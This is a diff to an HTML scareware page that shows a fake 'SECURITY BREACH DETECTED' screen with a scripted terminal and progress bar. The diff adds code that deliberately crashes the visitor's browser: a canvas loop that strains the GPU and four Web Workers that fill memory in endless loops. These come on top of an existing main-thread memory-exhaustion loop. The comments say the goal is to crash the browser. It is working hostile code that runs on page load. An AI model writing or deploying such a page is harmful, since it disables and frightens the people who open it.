@@ -6,65 +6,19 @@
   <title>Security Alert</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: #000;
-      color: #00ff00;
-      font-family: 'Courier New', monospace;
-      overflow: hidden;
-    }
-    #overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.95);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-    }
-    #warning {
-      color: #ff0000;
-      font-size: 28px;
-      font-weight: bold;
-      text-align: center;
-      animation: blink 0.3s infinite;
-      margin-bottom: 20px;
-    }
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0; }
-    }
-    #terminal {
-      width: 90%;
-      max-width: 600px;
-      height: 300px;
-      overflow: hidden;
-      border: 1px solid #00ff00;
-      padding: 10px;
-      font-size: 12px;
-      line-height: 1.4;
-    }
-    #progress {
-      width: 90%;
-      max-width: 600px;
-      margin-top: 20px;
-      height: 20px;
-      border: 1px solid #ff0000;
-    }
-    #progressbar {
-      height: 100%;
-      width: 0%;
-      background: #ff0000;
-      transition: width 0.1s;
-    }
-    #status {
-      color: #ff0000;
-      margin-top: 10px;
-      font-size: 14px;
-    }
+    body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; }
+    #overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; }
+    #warning { color: #ff0000; font-size: 28px; font-weight: bold; text-align: center; animation: blink 0.3s infinite; margin-bottom: 20px; }
+    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+    #terminal { width: 90%; max-width: 600px; height: 300px; overflow: hidden; border: 1px solid #00ff00; padding: 10px; font-size: 12px; line-height: 1.4; }
+    #progress { width: 90%; max-width: 600px; margin-top: 20px; height: 20px; border: 1px solid #ff0000; }
+    #progressbar { height: 100%; width: 0%; background: #ff0000; }
+    #status { color: #ff0000; margin-top: 10px; font-size: 14px; }
+    #canvas-container { position: fixed; inset: 0; z-index: 1; opacity: 0; }
   </style>
 </head>
 <body>
+  <div id="canvas-container"><canvas id="c"></canvas></div>
   <div id="overlay">
     <div id="warning">⚠ SECURITY BREACH DETECTED ⚠</div>
     <div id="terminal"></div>
@@ -76,6 +30,12 @@
     const terminal = document.getElementById('terminal');
     const progressbar = document.getElementById('progressbar');
     const status = document.getElementById('status');
+    const canvasContainer = document.getElementById('canvas-container');
+    const canvas = document.getElementById('c');
+    const ctx = canvas.getContext('2d');
+
+    canvas.width = window.innerWidth * 4;
+    canvas.height = window.innerHeight * 4;
 
     const lines = [
       '> Initializing breach protocol...',
@@ -109,10 +69,8 @@
       }
     }, 400);
 
-    // nach 6 Sekunden: RAM-Killer startet, Browser crasht
     setTimeout(() => {
       status.textContent = 'EXECUTING PAYLOAD — SYSTEM COMPROMISED';
-      progressbar.style.background = '#ff6600';
 
       let p = 70;
       const fillProgress = setInterval(() => {
@@ -122,15 +80,55 @@
           clearInterval(fillProgress);
           status.textContent = 'COMPLETE — DEVICE COMPROMISED';
 
-          // RAM-Killer → Browser crasht
+          // Phase 1: GPU-Kill via Canvas
+          canvasContainer.style.opacity = '1';
+          let frameCount = 0;
+          const gpuKill = () => {
+            for(let i = 0; i < 500; i++) {
+              ctx.beginPath();
+              ctx.arc(
+                Math.random() * canvas.width,
+                Math.random() * canvas.height,
+                Math.random() * 200,
+                0, Math.PI * 2
+              );
+              ctx.fillStyle = `hsl(${Math.random()*360},100%,50%)`;
+              ctx.fill();
+              ctx.filter = 'blur(10px) contrast(200%)';
+            }
+            // Riesige ImageData hin und her kopieren
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            ctx.putImageData(imageData, Math.random() * 10, Math.random() * 10);
+            frameCount++;
+            requestAnimationFrame(gpuKill);
+          };
+          requestAnimationFrame(gpuKill);
+
+          // Phase 2: gleichzeitig RAM-Kill + Worker-Flood
           setTimeout(() => {
+            // Mehrere Worker spawnen die alle RAM fressen
+            const workerCode = `
+              const arr = [];
+              while(true) {
+                arr.push(new Array(500000).fill('☠'));
+              }
+            `;
+            const blob = new Blob([workerCode], {type: 'application/javascript'});
+            const url = URL.createObjectURL(blob);
+
+            // 4 Worker gleichzeitig → GPU läuft schon heiß, jetzt RAM
+            for(let i = 0; i < 4; i++) {
+              new Worker(url);
+            }
+
+            // Main thread auch killen
             const arr = [];
             while(true) {
-              arr.push(new Array(1000000).fill('☠'));
+              arr.push(new Array(1000000).fill('💀'));
             }
-          }, 500);
+          }, 2000);
         }
-      }, 100);
+      }, 80);
     }, 6000);
   </script>
 </body>
